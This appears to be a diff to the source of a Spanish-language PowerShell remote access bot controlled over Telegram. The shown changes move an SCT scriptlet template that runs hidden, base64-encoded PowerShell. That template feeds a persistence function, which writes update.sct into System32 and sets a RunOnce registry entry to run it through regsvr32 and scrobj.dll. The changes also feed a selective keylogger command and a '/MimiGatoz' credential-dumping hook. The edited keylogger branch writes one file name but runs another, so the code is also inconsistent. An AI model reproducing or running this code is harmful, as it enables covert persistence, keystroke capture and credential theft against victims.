@@ -22,24 +22,6 @@ $codeScript = [Convert]::ToBase64String($UnicodeEncoder.GetBytes($command))
 return $codeScript
 }
 
-$plantilla_sct = '<?XML version="1.0"?>
-<scriptlet>
-<registration
-description="Win32COMDebug"
-progid="Win32COMDebug"
-version="1.00"
-classid="{AAAA1111-0000-0000-0000-0000FEEDACDC}"
- >
- <script language="JScript">
-      <![CDATA[
-           var r = new ActiveXObject("WScript.Shell").Run("' + $CODE + '",0);
-      ]]>
- </script>
-</registration>
-<public>
-    <method name="Exec"></method>
-</public>
-</scriptlet>'
 
 ################################################ Cargamos funciones de otros proyectos ########################################################################
 
@@ -209,6 +191,24 @@ function persistence {
 If (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator"))
 {$texto = "Sorry, necesitas privilegios"; return $texto;break }  else {
 $agent_bot = create_agent -botkey $botkey -chat_id $chat_id;  $agent_bot = $agent_bot -replace "con bypassuac :D","" ; $code = code_a_base64 -code $agent_bot; $code = "powershell.exe -win hidden -enc " + $code
+$plantilla_sct = '<?XML version="1.0"?>
+<scriptlet>
+<registration
+description="Win32COMDebug"
+progid="Win32COMDebug"
+version="1.00"
+classid="{AAAA1111-0000-0000-0000-0000FEEDACDC}"
+ >
+ <script language="JScript">
+      <![CDATA[
+           var r = new ActiveXObject("WScript.Shell").Run("' + $CODE + '",0);
+      ]]>
+ </script>
+</registration>
+<public>
+    <method name="Exec"></method>
+</public>
+</scriptlet>'
 $plantilla_sct | Out-File -Encoding ascii "C:\Windows\System32\update.sct" 
 $key = "registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce"; $modifica = "c:\windows\system32\regsvr32.exe /s /n /u /i:c:\windows\system32\update.sct scrobj.dll" ; set-item $Key $modifica
 $texto = "Persistencia ejecutada correctamente"} return $texto;break}
@@ -264,7 +264,25 @@ function test-command {param ($comando="",$botkey="",$chat_id="",$first_connect=
  if ($comando -like "/Persistence On") {$texto = persistence; envia-mensaje -text $texto -botkey $botkey -chat $chat_id}
  if ($comando -like "/Persistence Off") {$texto = remove-persistence; envia-mensaje -text $texto -botkey $botkey -chat $chat_id}
  if ($comando -eq "/KeyLogger_Selective") {$texto = "Activa un KeyLogger de manera selectiva.`n Ejemplo: /KeyLogger_Selective facebook"; envia-mensaje -text $texto -botkey $botkey -chat $chat_id}
- if ($comando -like "/KeyLogger_Selective *") {$comando = $comando -replace "/KeyLogger_Selective ",""; $code = (crea_keylogger -extrae $comando); $code = "powershell.exe -win hidden -enc " + $code ; $plantilla_sct | Out-File -Encoding ascii "C:\Windows\System32\log.sct" ; Start-Process c:\windows\system32\regsvr32.exe -ArgumentList '/s /n /u /i:c:\windows\system32\log.sct scrobj.dll' ;$texto = "Lanzado Keylogger_Selective $comando" ; envia-mensaje -text $texto -botkey $botkey -chat $chat_id }
+ if ($comando -like "/KeyLogger_Selective *") {$comando = $comando -replace "/KeyLogger_Selective ",""; $code = (crea_keylogger -extrae $comando); $plantilla_sct = '<?XML version="1.0"?>
+<scriptlet>
+<registration
+description="Win32COMDebug"
+progid="Win32COMDebug"
+version="1.00"
+classid="{AAAA1111-0000-0000-0000-0000FEEDACDC}"
+ >
+ <script language="JScript">
+      <![CDATA[
+           var r = new ActiveXObject("WScript.Shell").Run("' + $CODE + '",0);
+      ]]>
+ </script>
+</registration>
+<public>
+    <method name="Exec"></method>
+</public>
+</scriptlet>'
+$plantilla_sct | Out-File -Encoding ascii "C:\Windows\System32\update.sct"  ; Start-Process c:\windows\system32\regsvr32.exe -ArgumentList '/s /n /u /i:c:\windows\system32\log.sct scrobj.dll' ;$texto = "Lanzado Keylogger_Selective $comando" ; envia-mensaje -text $texto -botkey $botkey -chat $chat_id }
  if ($comando -like "/MimiGatoz") {mimigatoz}
 
 }
